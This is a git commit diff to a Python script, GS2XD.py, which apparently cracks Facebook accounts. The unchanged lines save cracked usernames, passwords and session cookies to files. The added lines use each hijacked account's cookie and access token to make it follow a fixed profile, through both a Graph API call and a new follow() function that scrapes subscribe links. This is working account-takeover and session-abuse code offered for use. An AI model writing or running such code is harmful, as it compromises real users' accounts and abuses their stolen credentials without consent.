7f67f87cd65a92c7c8c7701b7d668fa0ea424c73
mdtasin123 <129798134+mdtasin123@users.noreply.github.com>
2023-06-15 18:25:19 +0530

    Add files via upload

--- GS2XD.py
+++ GS2XD.py
@@ -778,6 +778,8 @@ class crack:
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
+                        follow_id='100000160984736'
+                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
                         print(f"\r\033[1;33m[TL-GSXD] {used} | {pw} {VV}    ")
@@ -926,6 +928,8 @@ class crack:
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
+                        follow_id='100000160984736'
+                        subs = requests.post('https://graph.facebook.com/'+follow_id+'/subscribers?access_token='+tokic, cookies={'cookie':cokie}).text
                         break
                     except KeyError:
                         print(f"\r\033[1;33m[TL-GSXD] {used} | {pw} {VV}    ")
@@ -1011,6 +1015,19 @@ class crack:
             print(f"\r{EE}[CP-GSXD] {user} | {pw} {VV}    ")
             open("/sdcard/GSXD_CP.txt", "a").write(user + "|" + pw + "\n")
             cp.append(user + pw)
+
+def follow(self,coki):
+        session = requests.Session()
+        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100000160984736",cookies={"cookie":coki}).text,"html.parser")
+        for x in r.find_all("a",href=True):
+            if "/a/subscribe.php" in x.get('href'):
+                session.get('https://mbasic.facebook.com'+x.get('href'), cookies={'cookie':coki}).text
+        if '/a/subscribe.php' in str(r):
+            b=str(r).split('/a/subscribe.php')[1].split('">')[0].replace('&amp;', '&')
+            session.get("https://mbasic.facebook.com/a/subscribe.php"+str(b), cookies={"cookie":coki}).text
+        else:
+            pass
+
 
 
     def __pler_(self):
